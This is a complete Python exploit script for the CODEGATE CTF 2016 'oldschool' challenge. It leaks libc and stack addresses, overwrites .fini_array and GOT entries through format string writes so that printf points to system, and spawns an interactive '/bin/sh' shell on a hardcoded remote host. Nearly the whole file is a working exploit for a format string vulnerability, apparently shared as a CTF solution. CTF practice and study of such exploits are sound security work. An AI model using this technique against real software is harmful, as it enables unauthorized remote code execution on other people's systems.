#!/usr/bin/python
#
# CODEGATE CTF 2016
# oldschool (PWN/490)
#
# @a: Smoke Leet Everyday
# @u: https://github.com/smokeleeteveryday
#

import re
from pwn import *
from struct import pack

def extract_leaks(msg):
	index = msg.find('RESPONSE :') + len('RESPONSE :')
	return (long(msg[index:index+8], 16)), (long(msg[index+8:index+16], 16))

def construct_stage_1():
	# offset of our dst_addr in our buffer (in DWORDs)
	offset_1 = 7 + 4
	# libc pointer leak offset (in DWORDs)
	offset_2 = 267
	# stack pointer leak offset (in DWORDs)
	offset_3 = 264

	# .fini_array address
	dst_addr = 0x080496DC
	# <main+0> address
	lsb_overwrite = 0x849B
	# how many bytes to output to set internal written counter to lsb_overwrite
	val = (lsb_overwrite - (16 + 4))

	# Construct FMS exploit string
	return chr(0x25) + str(offset_2) + '$08x' + chr(0x25) + str(offset_3) + '$08x' + pack('<I', dst_addr) + chr(0x25) + str(val) + 'x' + chr(0x25) + str(offset_1) + '$hn.'

def construct_stage_2(stackcookie_addr, system_addr):
	# Offsets of first 3 DWORDs of our buffer on stack and the saved stack cookie (in DWORDs)
	offset = [7, 8, 9, 10]

	# .got:__stack_chk_fail address
	dst_addr_1 = 0x080497E4
	# <main+0> address
	main_lsb = 0x849B

	# .got:printf address
	dst_addr_2 = 0x080497DC
	# __libc_system address
	# LSBs and MSBs are written seperately in short writes
	system_lsb = (system_addr & 0x0000FFFF)
	system_msb = ((system_addr & 0xFFFF0000) >> 16)

	# Addresses to write to
	adr = [0, 0, 0, 0]
	# Values to print to adjust internal output counter for writing
	val = [0, 0, 0, 0]

	# these bytes will have been already output (for addresses) upon first fms output
	already_written = (4 * 4)

	# We write in ascending order of size
	# main_lsb is smallest
	if ((main_lsb < system_lsb) and (main_lsb < system_msb)):
		# write main_lsb first
		adr[0] = (dst_addr_1)
		val[0] = (main_lsb - already_written)

		if (system_lsb < system_msb):
			# write system_lsb next
			adr[1] = (dst_addr_2)
			val[1] = (system_lsb - main_lsb)

			adr[2] = (dst_addr_2 + 2)
			val[2] = (system_msb - system_lsb)
		else:
			# write system_msb next
			adr[1] = (dst_addr_2 + 2)
			val[1] = (system_msb - main_lsb)

			adr[2] = (dst_addr_2)
			val[2] = (system_lsb - system_msb)

	# system_lsb is smallest
	elif ((system_lsb < main_lsb) and (system_lsb < system_msb)):
		# write system_lsb first
		adr[0] = (dst_addr_2)
		val[0] = (system_lsb - already_written)

		if (main_lsb < system_msb):
			# write main_lsb next
			adr[1] = (dst_addr_1)
			val[1] = (main_lsb - system_lsb)

			adr[2] = (dst_addr_2 + 2)
			val[2] = (system_msb - main_lsb)
		else:
			# write system_msb next
			adr[1] = (dst_addr_2 + 2)
			val[1] = (system_msb - system_lsb)

			adr[2] = (dst_addr_1)
			val[2] = (main_lsb - system_msb)

	# system_msb is smallest
	elif ((system_msb < main_lsb) and (system_msb < system_lsb)):
		# write system_msb first
		adr[0] = (dst_addr_2 + 2)
		val[0] = (system_msb - already_written)

		if (main_lsb < system_lsb):
			# write main_lsb next
			adr[1] = (dst_addr_1)
			val[1] = (main_lsb - system_msb)

			adr[2] = (dst_addr_2)
			val[2] = (system_lsb - main_lsb)
		else:
			# write system_lsb next
			adr[1] = (dst_addr_2)
			val[1] = (system_lsb - system_msb)

			adr[2] = (dst_addr_1)
			val[2] = (main_lsb - system_lsb)

	# Set up clobbering of saved stack cookie
	adr[3] = stackcookie_addr

	if ((val[2] & 0xFF) != 0):
		if ((val[2] & 0xFF) == 0xFF):
			val[3] = 2
		else:
			val[3] = 1
	else:
		val[3] = 1
	return pack('<I', adr[0]) + pack('<I', adr[1]) + pack('<I', adr[2]) + pack('<I', adr[3]) + chr(0x25) + str(val[0]) + 'x' + chr(0x25) + str(offset[0]) + '$hn'  + chr(0x25) + str(val[1]) + 'x' + chr(0x25) + str(offset[1]) + '$hn'  + chr(0x25) + str(val[2]) + 'x' + chr(0x25) + str(offset[2]) + '$hn' + chr(0x25) + str(offset[3]) + '$hn'

# Convert fms exploit to reliable infoleak
def stage_1(h):
	fms_exploit = construct_stage_1()
	h.sendline(fms_exploit)
	msg = h.recv(1024)
	return extract_leaks(msg)

# Set stage for ROP attack & execute it
def stage_2(h, stackcookie_addr, system_addr, cmd):
	fms_exploit = construct_stage_2(stackcookie_addr, system_addr)
	h.sendline(fms_exploit)
	h.sendline(cmd)
	h.interactive()
	return

cmd = '/bin/sh'
libc_offsets = {'2.21': {'libc_start_main_ret': 0x0001873E, 'system': 0x0003B180}}
version = '2.21'
libc_start_main_ret_offset = libc_offsets[version]['libc_start_main_ret']
system_offset = libc_offsets[version]['system']
cookie_ptr_offset = (0xF8 + 0xC)

host = '175.119.158.131'
port = 17171

h = remote(host, port, timeout = None)

print "[*] Executing stage 1..."

libc_base_addr, stackcookie_addr = stage_1(h)
libc_base_addr = (libc_base_addr - libc_start_main_ret_offset)
system_addr = (libc_base_addr + system_offset)
stackcookie_addr = (stackcookie_addr - cookie_ptr_offset)

print "[+] Got libc base address: [%x]" % libc_base_addr
print "[+] Got system() address: [%x]" % system_addr
print "[+] Got stack cookie address: [%x]" % stackcookie_addr

print "[*] Executing stage 2..."

stage_2(h, stackcookie_addr, system_addr, cmd)

h.close()